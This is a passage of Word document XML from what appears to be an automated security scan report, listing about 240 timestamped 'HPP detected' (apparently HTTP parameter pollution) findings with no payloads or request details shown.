        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.259982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579. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.263688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580. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.266362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581. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.269789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582. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.273429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583. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.276640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584. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.279818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585. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.283851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586. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.286917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587. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.289537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588. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.293318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589. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.295961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590. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.299110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591. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.302358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592. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.304494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593. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.306705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594. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.308304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595. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.310446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596. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.312607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597. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.314775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598. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.316927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599. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.318529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600. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.320670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601. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.322271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602. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.324393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603. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.325983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604. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.328101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605. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.329694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606. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.331822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607. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.333986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608. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:45:33.335577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609. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.642029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610. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.645251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611. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.649026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612. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.652263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613. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.655451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614. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.658207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615. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.661449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616. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.664672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617. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.667908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618. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.671117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619. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.674944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620. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.677611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621. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.680794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622. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.683977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623. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.687690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624. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.689904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625. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.691520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626. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.693660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627. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.695267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628. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.697388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629. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.698997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630. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.701127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631. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.703276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632. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.705455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633. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.707600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634. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.709755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635. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.711896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636. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.714194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637. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.716977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638. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.719097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639. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.721299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640. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:48:38.723457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641. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.489214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642. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.494029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643. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.497252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644. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.499887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645. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.503338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646. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.506275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647. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.509485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648. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.512633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649. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.515816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650. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.519039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651. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.521786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652. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.524439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653. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.527675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654. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.531379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655. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.534600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656. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.536740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657. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.538863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658. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.541017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659. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.543158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660. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.544751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661. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.546884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662. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.548463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663. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.550078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664. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.552204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665. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.554329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666. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.556472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667. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.558044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668. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.559627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669. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.561716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670. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.563313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671. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.565016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672. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:51:44.567185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673. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.631397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674. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.635666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675. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.638867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676. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.642429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677. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.645687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678. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.648906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679. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.652159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680. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.654850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681. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.657687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682. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.661293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683. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.664494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684. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.667664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685. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.670330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686. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.673738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687. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.676958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688. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.679637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689. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.681976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690. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.684125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691. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.686271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692. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.687876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693. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.689491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694. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.691598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695. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.693895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696. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.696063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697. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.697677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698. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.699425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699. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.701548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700. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.703138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701. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.705158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702. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.707278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703. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.708892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704. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:54:50.711017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705. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.092810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706. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.097670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707. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.100876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708. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.103713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709. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.107504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710. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.111273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711. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.114490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712. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.117123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713. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.120938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714. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.125207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715. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.128432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716. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.132178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717. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.134361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718. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.137077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719. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.140331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720. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.142516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721. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.144672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722. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.146824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723. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.148983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724. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.151135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725. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.153255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726. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.154851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727. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.156960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728. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.159067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729. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.160678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730. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.162260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731. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.164381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732. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.166097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733. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.168208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734. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.170115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735. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.172243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736. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:57:56.173837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737. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.432547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738. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.436313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739. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.439585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740. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.442809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741. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.446088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742. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.448811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743. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.452039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744. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.454431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745. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.457659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746. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.461430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747. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.464623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748. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.467892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749. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.470059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750. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.473283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751. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.477219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752. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.479929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753. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.481552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754. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.483678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755. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.485848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756. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.487443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757. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.489620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758. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.491294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759. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.492907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760. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.495055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761. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.496685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762. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.498855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763. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.500457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764. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.502075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765. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.503700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766. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.506396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767. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.509122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768. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:01:01.512432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769. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.247738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770. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.251552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771. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.254859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772. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.258081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773. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.261884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774. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.265130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775. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.267807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776. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.271075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777. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.273814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778. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.277061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779. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.280298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780. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.282965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781. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.285688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782. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.289481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783. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.292135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784. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.294848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785. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.296477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786. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.298626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787. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.300798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788. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.303519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789. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.305683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790. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.307287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791. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.309461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792. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.312111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793. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.313735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794. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.316480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795. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.318059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796. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.320221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797. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.321851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798. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.324021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799. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.326182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800. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:04:07.328336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801. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.926083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802. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.929776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803. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.932988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804. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.935651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805. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.939430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806. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.942109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807. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.944772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808. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.947959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809. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.951164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810. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.954953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811. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.958182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812. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.960915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813. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.964137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814. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.966838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815. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.970154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816. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.972285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817. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.974441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818. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.976066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819. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T13:07:12.978177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820. **HPP detected**</w:t>
